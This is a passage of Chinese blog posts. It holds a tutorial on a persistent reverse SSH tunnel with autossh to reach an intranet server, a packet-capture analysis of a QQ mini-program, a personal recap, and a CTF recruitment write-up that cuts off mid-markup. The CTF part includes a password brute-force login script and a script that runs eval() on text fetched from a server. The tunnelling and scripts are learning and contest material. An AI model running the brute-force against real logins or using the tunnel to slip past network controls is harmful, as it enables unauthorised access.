language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com -p 22</code></pre><blockquote><p>-R port1:host:port2 将远程机器的端口映射到本地。port1是公网服务器B的端口，host为本地A的IP，port2是A要映射到公网的端口。<br><code>usr_b@test.com</code> 用户名@服务器B地址，表示连接到B，以用户<code>usr_b</code>登录。当然<code>test.com</code>也可以是IP地址啦。<br>-f SSH客户端在后台运行<br>-C 允许压缩<br>-g 允许远程主机可远程访问，这里有坑。  （但<code>autossh</code>没有这个选项所以应该影响不大）<br>-N Do not execute a shell or command. 不执行脚本或命令，通常与-f连用。<br>-p 22 表示指定连接到B的22端口，默认就是22啦，如果不是的话设置成B的ssh端口。   </p></blockquote><p>注意一下，<em>（网上说）</em>这里有个坑，-g还需要在公网服务器B做下面的设置，设置完后再重启服务。</p><pre class=" language-bash"><code class="language-bash">＃vim /etc/ssh/sshd_config 新增GatewayPorts <span class="token function">yes</span></code></pre><hr><h4 id="进阶1-autossh"><a href="#进阶1-autossh" class="headerlink" title="进阶1  autossh"></a><strong>进阶1  autossh</strong></h4><p>由于ssh会自动断开连接，于是<strong>利用自动重连工具<code>autossh</code>，保证连接稳定</strong>。</p><p>首先安装autossh，这里我用的是CentOS系统。其他类似的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> yum -y <span class="token function">install</span> autossh</code></pre><blockquote><p>其实我发现yum（的源里）找不到autossh，后来是用wget下载然后手动安装的…</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">screen</span> -S reverse_proxyautossh -M <span class="token operator">&lt;</span>port2<span class="token operator">></span> -CNR <span class="token operator">&lt;</span>port1<span class="token operator">></span>:localhost:22 usr_b@test.com</code></pre><p>多了个-M参数，表示从B的port2检测是否断线。同时autossh会在后台运行，-f也不需要了。  </p><p>这里的screen用于命令行终端切换，给这个界面起了个名叫<code>reverse_proxy</code>，当然没有装screen的话也需要装一下，不过不执行screen这条语句理论上也能用。</p><p><strong>注意，port1和port2均需要在B的安全组内设好规则，允许外网访问。</strong>  </p><p>而后看一下有没有运行↓</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021730475.png" alt="看一下进程"></p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220022409722.png" alt="netstat看一下"></p><p>可见A已和B建立连接。<br>此处port1为9999，port2为9998，仅用于演示，你完全可以看心情选择你喜欢的端口，当然有的端口有特定功能另外说。  </p><hr><h4 id="进阶2-开机自启"><a href="#进阶2-开机自启" class="headerlink" title="进阶2  开机自启"></a><strong>进阶2  开机自启</strong></h4><p>当然，为了连接再可靠一点，确保A重启后还可以连上，可以在A上再设置一下<strong>开机自动启动autossh</strong>。</p><p>有一种方法是在<code>/etc/rc.local</code>里面添加如下内容</p><pre class=" language-bash"><code class="language-bash"><span class="token function">su</span> - user_a -c <span class="token string">"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2> -CNR &lt;port1>:localhost:22 usr_b@test.com"</span></code></pre><p>其中，<code>-i</code>后接的是SSH_KEY_FILE_PATH，即私钥地址，root用户默认为<code>/root/.ssh/id_rsa</code>。<br><code>user_a</code>是A上的用户，且要求在公网服务器B上，已经有了A主机上用户user_a的公钥<em>（这个在下面B的设置中介绍）</em>。</p><p>然后记得给这个文件赋予<strong>可执行</strong>权限。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x /etc/rc.d/rc.local</code></pre><p>不过看这个文件注释里的说法，好像这个方法不推荐了。  </p><p>当然<strong>还可以使用其他的配置开机自启的方法</strong>，我也刚折腾对Linux也不熟，后面再看看吧。  </p><p>现在你可以<code>reboot</code>试一下了，前提是你能确保用这台服务器的其他人没意见，重要数据记得保存好噢。   </p><p>这样A上的设置就告一段落了，下面看公网服务器B。  </p><hr><h3 id="公网服务器B上的设置"><a href="#公网服务器B上的设置" class="headerlink" title="公网服务器B上的设置"></a>公网服务器B上的设置</h3><p>如果只需要在B上对A进行远程炼丹，那就不需要在B上设置啥了，现在<strong>直接ssh就完事了</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>因为已经把A的ssh对应的22端口映射到B的port1端口了呀！  </p><p>试一下果然如此。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220023008851.png" alt="在B上ssh连接A"></p><h4 id="进阶-免密登录"><a href="#进阶-免密登录" class="headerlink" title="进阶  免密登录"></a>进阶  免密登录</h4><p>这样每次登录都需要输入密码，是有点麻烦了。</p><p>这有个办法，就是把本机的ssh公钥复制到要登录的服务器A的<code>~/.ssh/authorized_key</code>文件中，实现免密登录。</p><p>什么，你还觉得太麻烦了？？？</p><p>这里还有一个快办法，就是在B上登录A后执行这个——</p><pre class=" language-bash"><code class="language-bash">ssh-copy-id -i .ssh/id_rsa.pub  usr_a@172.x.x.x</code></pre><blockquote><p>-i 指向本地的公钥文件，一般在用户的目录下。<br><code>usr_a</code> 为A上要登录的用户名</p></blockquote><p>然后就可以从B免密登录内网服务器A啦。你现在可以在B上ssh试一下，理论上直接就已经登录好了呢！  </p><hr><h3 id="在任意一台联网主机C对A进行访问的实现"><a href="#在任意一台联网主机C对A进行访问的实现" class="headerlink" title="在任意一台联网主机C对A进行访问的实现"></a>在任意一台联网主机C对A进行访问的实现</h3><p>到这里我有点成就感了，<strong>远程炼丹实际上已经实现了</strong>。  </p><p>然而我的初衷是要<strong>在一台能联网的主机C上去连接内网A</strong>的呀，不行还得再折腾一下啊呜。  </p><p>首先试了一下直接连接公网服务器B的port1，然而不可行。  </p><p>不过网上有些资料说是可行的，这个我也不知道呢，可能要问神奇的海螺吧。   </p><blockquote><p>根据网上的说法，已经在B上对<code>GatewayPorts</code>进行了设置，也杀死进程重启了服务甚至直接<code>reboot</code>了，然而不知道为啥不可行……</p></blockquote><p>不过也不是没有办法呢，ssh里还有个<strong>正向代理</strong>闲着没事干呢，说上就上吧。  </p><p>在B上继续进行如下配置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost</code></pre><p>表示将B上的port1映射到port3，注意<strong>port3也要设置安全组规则</strong>啊。  </p><p>用<code>ss -ant</code> 看了一下，port3的确打开了。  </p><p>理论上这样的话在C上ssh连接B的port3端口，就可以直接访问到内网A了的。</p><p>如果你成功了，那就可以<strong>直接跳到配置VSCode的部分</strong>了，<strong>尽情享受远程炼丹的快感吧！</strong>  </p><p><strong>喜欢的话可以滑到页面下方，赞赏一下给我买点好吃的<em>（我饿了.jpg</em></strong>    </p><hr><p><strong>然而我并没有成功……</strong>  </p><p>看了一下安全组设置，没问题，唉，大不了全开了嘛。还是不行。  </p><p>这里我难受死了，杀死进程又重来试了好几次，一样没有效果。  </p><p>再去网上查了查，直到看到一篇文章里提到了这个问题，但他直接用的ssh而没有用到autossh，用他的方案还是没解决问题。不过里面提到了一个命令叫<code>lsof</code>，即“列出打开文件(lists openfiles)”，而在Unix中一切（包括网络套接口）都是文件。<strong>这可是个神器啊！</strong>  </p><p>这里用到的是     </p><blockquote><p>使用<code>-i :port</code>来显示与指定端口相关的网络信息。  </p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">lsof</span> -i :<span class="token operator">&lt;</span>port3<span class="token operator">></span>  <span class="token comment" spellcheck="true"># 查看连接port3端口的网络信息</span></code></pre><p>结果类似于这样（忘记截图了），此处port3为仅供演示所用的9988。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     658 root    4u  IPv6  146251      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>这里我才发现，噫，怎么只监听了IPv6，而没有IPv4啊！</p><p>实际上通过<code>ss -ant</code>也可以发现对应的端口只有tcp6而没有tcp…  </p><p>然而阿里云实例（安全组内）只有IPv4出口来着，而且也是通过IPv4连接到B的，怪不得连不上呢。（佛了  </p><p>不过也奇怪了，理论上ssh应该v4和v6都监听的吧。  </p><p>去查了一下ssh命令，这次<strong>强制使用 IPv4</strong>试试。  </p><p>（在B上杀死之前的ssh，再执行下面的命令。记得改成你的端口哈。  </p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port3<span class="token operator">></span>:localhost:<span class="token operator">&lt;</span>port1<span class="token operator">></span> localhost -4</code></pre><blockquote><p><code>-4</code>表示强制使用IPv4</p></blockquote><p>这回再看<code>lsof -i :&lt;port3&gt;</code>：  </p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># lsof -i :9988</span>COMMAND PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     954 root    4u  IPv4  255331      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>然后再在C上连接B的port3端口。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021132045.png" alt="通过外网成功连上内网服务器"></p><p>哇哇哇成功了！  </p><p>看来果然是这个问题啊我哭了又笑了。  </p><p>下面就可以设置VSCode来实现远程炼丹啦！  </p><h2 id="Guidance-for-VSCode"><a href="#Guidance-for-VSCode" class="headerlink" title="Guidance for VSCode"></a>Guidance for VSCode</h2><p>具体可以参考<em>Reference #1</em>，这里简单操作一下。  </p><p>在VSCode安装<strong><code>Remote Development</code>开发包（扩展）</strong>，然后在远程资源管理器里新增一个SSH Target。  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011642994.png" alt="VSCode_ssh配置"></p><p>在用户的<code>.ssh/config</code>文件内新增你的内网炼丹炉信息。</p><blockquote><p>Host 给你的内网主机起个名（看你心情随意取）<br>HostName  公网服务器B的IP或域名<br>Port 填port3，如果port1能连上就填port1<br>User 填内网服务器A的登录用户名    </p></blockquote><p>保存，然后便可以连接试一试了。  </p><p>连接后输入A对应用户的密码，然后就连上了。打开文件夹还需要再输一次密码。   </p><p>现在再用前面在B的配置里说的办法，把C主机的公钥放到A里就可以实现免密登录啦！   </p><p>呐，这就是在C上连接到内网炼丹炉的效果了↓。</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011440883.png" alt="VSCode远程炼丹效果"></p><p>网络延时几乎没有<em>（不过也取决于网络环境）</em>，和在本地编程几乎没有差别，爽到爆炸！  </p><p>哇哇哇成就感爆棚啊哇哇哇！！！</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>时间因素，不可避免可能存在一些失误之处，其中也有不少可以拓展之处，欢迎交流提出哈。  </p><p>本文<strong>仅用于学习研究，请在合理合法范围内使用</strong>，</p><p><strong>未经允许不得商用，转载请署名MiaoTony并保留本文链接</strong>，谢谢。</p><p>说点题外话吧。  </p><blockquote><p>上周末到这周部署<a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener"><code>NUAA_iCal_Web</code>在线版本</a>弄了一周末（好菜啊第一次弄部署来着…），配服务器环境折腾了老半天（甚至只装好了GPU驱动和anaconda还没配CUDA），配远程炼丹又瞎折腾了一两天，写这篇文章又断断续续地花了好几个小时。  </p></blockquote><p>呜下周开始频繁考试了，不敢瞎折腾了嘤嘤嘤。（溜了溜了   </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/89662757" target="_blank" rel="noopener">使用vscode进行远程炼丹</a> </li><li><a href="https://www.cnblogs.com/zhongbin/p/3940956.html" target="_blank" rel="noopener">SSH反向连接使用Autossh自动ssh</a>  </li><li><a href="https://www.jianshu.com/p/3cd2793ba719" target="_blank" rel="noopener">利用阿里云ECS跳板机内网穿透- ssh</a> </li><li><a href="https://www.centos.bz/2017/08/ssh-reverse-proxy/" target="_blank" rel="noopener">SSH如何反向代理稳定穿透内网</a></li><li><a href="https://zhuanlan.zhihu.com/p/57477087" target="_blank" rel="noopener">内网穿透：在公网访问你家的 NAS</a>   （还包括<code>frp</code>相关）</li><li><a href="https://www.jianshu.com/p/85866b87c7d0" target="_blank" rel="noopener">从外网 SSH 进局域网，反向代理+正向代理</a></li><li><a href="https://www.jianshu.com/p/7accc1e485d3" target="_blank" rel="noopener">autossh 穿透，反向代理到内网</a></li><li><a href="https://blog.csdn.net/liu_qingbo/article/details/78383892" target="_blank" rel="noopener">ssh-copy-id三步实现SSH无密码登录和ssh常用命令</a></li><li><a href="https://www.jianshu.com/p/a3aa6b01b2e1" target="_blank" rel="noopener">Linux 命令神器：lsof</a></li><li><a href="https://www.oschina.net/translate/automatically-restart-ssh-sessions-and-tunnels-using-autossh" target="_blank" rel="noopener">使用 autossh 自动重启 SSH 会话和通道</a></li><li><a href="https://www.fcwys.cc/archives/371.html" target="_blank" rel="noopener">CentOS7添加开机启动服务或脚本</a></li></ol><p>etc.   </p><p>非常感谢上面这些文章，给了我很多启发呢。  </p>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> ssh </tag>
            
            <tag> VSCode </tag>
            
            <tag> 远程 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | QQ小程序【年终报告单/2019年终总结】分析</title>
      <link href="/2019/12/04/Scrapy_2019Year-end_Report/"/>
      <url>/2019/12/04/Scrapy_2019Year-end_Report/</url>
      
        <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。  </p><p>然而弹出一个遮罩层让你先看个15s的广告……  </p><p>超想吐槽，包括页面下面的广告。。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/movie.png" alt="movie"></p><p>然后看完广告，终于出来了。  </p><p>正当我截了图返回之后，噫换个性别试试。  </p><p>好，这回不一样了呀！  </p><p>然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。  </p><p>我兴趣来了，不如来折腾一下，分析一下这个小程序吧。  </p><p>（不折腾会死……</p><h2 id="开始折腾"><a href="#开始折腾" class="headerlink" title="开始折腾"></a>开始折腾</h2> <a id="more"></a> <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>先来看一看这个小程序的设置，发现只获取了<strong>用户信息</strong>。看一眼<strong>更多资料</strong>——  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image1.png" alt="image1"></p><p>先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是<code>wxa.game-a1.cn</code> 和<code>free-api.heweather.com</code>。  </p><p>查了一下，后者是一个查天气的API（需要的话可以用一波）<em>（就是很迷惑为啥这里会有这个</em>  </p><p>前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>ping了一下这个域名，得到IP：<code>47.105.42.112</code>  </p><p>然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/Inked.jpg" alt="Inked"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image2.png" alt="2"></p><p>前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。</p><p>很明显是访问了<code>http://wxa.game-a1.cn/wxa/qqnz2019/index.php</code>这个网址。</p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>浏览器启动，F12大法好呀。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image3.png" alt="image-20191204143118444"></p><p>好一个JSON字符串，来分析一下吧。  </p><p><code>qrcode</code>很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image4.png" alt="image-20191204143437363"></p><p><code>url</code>和<code>url1</code>都是一样的，指向了一个阿里云的对象存储。↓</p><p><a href="https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png" target="_blank" rel="noopener">https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png</a></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image5.png" alt="image-20191204143738991"></p><p>多次刷新发现好像的确就那几张图片，改变了一下<code>x.png</code>而已。  </p><p>而且的确这就是假的图啦。<em>（不然哪来的用户数据可以分析</em>  </p><hr><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>既然都知道是几张图片而已了，那顺便就爬下来吧。  </p><p>PyCharm 启动，来写一写jio本。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/code.png" alt="image-20191204150348574"></p><p>写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/download_imgs.png" alt="image-20191204144246023"></p><p>看结果的确就7张图片。。</p><p>呐就这几张了↓  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/1.png" alt="1"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/2.png" alt="2"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/3.png" alt="3"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/4.png" alt="4"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/5.png" alt="5"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/6.png" alt="6"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/7.png" alt="7"></p><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。   </p><p>就是这个<code>form.php</code>，看样子是用来统计使用数据的吧emmm问题不大。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image6.png" alt="image-20191204144935029"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>哇呜折腾了一个中午好气啊，<del><em>（有毒 不折腾会死</em></del></p><p>不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。</p><p>不过要吐槽这个广告超级讨厌emmm</p><p>就这样吧。</p><p>爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。</p><p>URL：<a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">这是网址</a></p><p><a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">https://github.com/miaotony/Scrapy_2019Year-end_Report</a></p>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纪念一下忙到爆炸超级难顶的十一月</title>
      <link href="/2019/12/02/Boom_2019November/"/>
      <url>/2019/12/02/Boom_2019November/</url>
      
        <content type="html"><![CDATA[<h2 id="纪念一下忙到爆炸超级难顶的十一月"><a href="#纪念一下忙到爆炸超级难顶的十一月" class="headerlink" title="纪念一下忙到爆炸超级难顶的十一月"></a>纪念一下忙到爆炸超级难顶的十一月</h2><p><del>（实在没忍住</del><br>本来就一堆事，然而有些活动还想去体验一下，不过收获倒是不少吧<br><del>（其实在作死…</del></p><p> <img src="/2019/12/02/Boom_2019November/plan.png" alt="plan"> </p> <a id="more"></a> <ul><li><p>电焊大赛 划了一波水  </p><p><img src="/2019/12/02/Boom_2019November/CircuitWeldingCompetition.jpg" alt="电焊大赛"></p></li><li><p>和师傅们玩了玩CTF（不务正业<br>到了大三才知道这个比赛嘤嘤嘤  太菜了，只拿了第六，不过有个一血还拿了个娃娃嘻嘻嘻<br>然而瞄了一眼NJUPT CTF题目，发现自己菜到爆炸。人家光是签到题就绕了好几个弯…   </p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF2.jpg" alt="ctf"></p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF.png" alt="ctf"></p></li><li><p>去东大打了一波Hackathon（不务正业<br>成功带飞俩学弟 拿了第四 三等奖<br> （微软爸爸真有钱，白嫖感觉超级爽233<br><img src="/2019/12/02/Boom_2019November/hackathon.JPG" alt="hackathon"><br><img src="/2019/12/02/Boom_2019November/hackathon3.png" alt="hackathon3"><br><img src="/2019/12/02/Boom_2019November/hackathon2.jpg" alt="hackathon2">   </p></li><li><p>做了持续一个月的校电赛<br>这回终于没有白给了，一等奖+最佳工程实践奖到手  </p><p><img src="/2019/12/02/Boom_2019November/NUAAEDC.jpg" alt="NUAAEDC"></p></li></ul><p>期间还有结课考试，准备大创中期材料，各种DDL，真就难顶到爆炸想自闭……  </p><p>不过要感谢超级棒的奶冰日常鼓励<br>没有奶冰的话包括<code>iCal</code>在内很多事真就很难坚持下去<br>还抑制住了我不少冲动233<br>还有陆师傅的<code>做好我们的就行了</code><br>于老板的<code>加油啊你们都大三了</code><br>焰焰的<code>先做好当下的事</code><br>一帆学弟的<code>冲冲冲</code><br>还有舍友的通情达理<br>etc.  </p><h2 id="转眼间就十二月啦"><a href="#转眼间就十二月啦" class="headerlink" title="转眼间就十二月啦"></a>转眼间就十二月啦</h2><p>这个月应该就没有比赛什么的了，不过项目进度有空还得赶一赶8<br>还要补课内欠下的一堆难到爆炸看不懂的知识<br>还有大作业、课设、实验，以及接下来几周陆续结课马上到来的考试……<br>（当然有空的话还想出去转一转（都好久没出门了嘤嘤嘤 除了去了趟SEU  </p><p>总之——<br><strong>接下来的两个月加油冲冲冲！</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> 日常生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Asuri战队 2019招新赛 WriteUP</title>
      <link href="/2019/11/28/CTF_2019Asuri_Recruitment/"/>
      <url>/2019/11/28/CTF_2019Asuri_Recruitment/</url>
      
        <content type="html"><![CDATA[<h1 id="Asuri-招新赛WriteUP-20191117"><a href="#Asuri-招新赛WriteUP-20191117" class="headerlink" title="Asuri 招新赛WriteUP 20191117"></a>Asuri 招新赛WriteUP 20191117</h1><p>网址： <a href="http://139.9.212.218:8000/challenges" target="_blank" rel="noopener">http://139.9.212.218:8000/challenges</a>  </p><p>官方安排及WriteUP：<a href="https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp" target="_blank" rel="noopener">https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp</a>  </p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><code>flag{this_is_test_flag}</code> </p><h2 id="misc-签到"><a href="#misc-签到" class="headerlink" title="misc-签到"></a>misc-签到</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185210292.png" alt="misc"></p><p>base64解码即得到</p><p><code>flag{1_want_jiamus_p0wer}</code>  </p><h2 id="baby-web-九曲十八弯"><a href="#baby-web-九曲十八弯" class="headerlink" title="baby-web-九曲十八弯"></a>baby-web-九曲十八弯</h2><p> <a href="http://desperadoccy.club:39011/" target="_blank" rel="noopener">http://desperadoccy.club:39011/</a> </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185108626.png" alt="image-20191117185108626"></p><p>base64解码</p><p><code>Asuri{view_source&#39;s_power}</code></p><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><p> <a href="http://47.102.107.100:39012/" target="_blank" rel="noopener">http://47.102.107.100:39012/</a> </p> <a id="more"></a> <p>连续20次在1-2s内判断是否正确，即可得到flag。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    equation <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;div>(.*)=(.*)&lt;/div>'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>equation<span class="token punctuation">)</span>    answer <span class="token operator">=</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> answer <span class="token operator">==</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117195746861.png" alt="image-20191117195746861"></p><p><code>Asuri{python_1s_th3_be3t_l4ngu4ge}</code></p><h2 id="medium-web-justburp"><a href="#medium-web-justburp" class="headerlink" title="medium_web_justburp"></a>medium_web_justburp</h2><p> <a href="http://139.9.212.218:39010/" target="_blank" rel="noopener">http://139.9.212.218:39010/</a> </p><p>查找网站目录下的文件</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117204536434.png" alt="image-20191117204536434"></p><p>访问<code>robots.txt</code> 得到：  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212248603.png" alt="image-20191117212248603"></p><p>访问<code>hint.php</code> 得到一个文件  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212350116.png" alt="image-20191117212350116"></p><p>尝试以<code>admin</code>作为用户名，用以上信息作为密码写脚本进行登录，  </p><p>然而好像没有成功（有可能有成功的没看到？？？  </p><blockquote><p>难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…<br>加一个if重新来就看到了惹emmm</p></blockquote><p><strong>爆破一波</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'name-pass.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    contents <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(contents)</span>    passwords <span class="token operator">=</span> contents<span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>              <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">if</span> <span class="token string">'密码错误'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>即可得到</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span 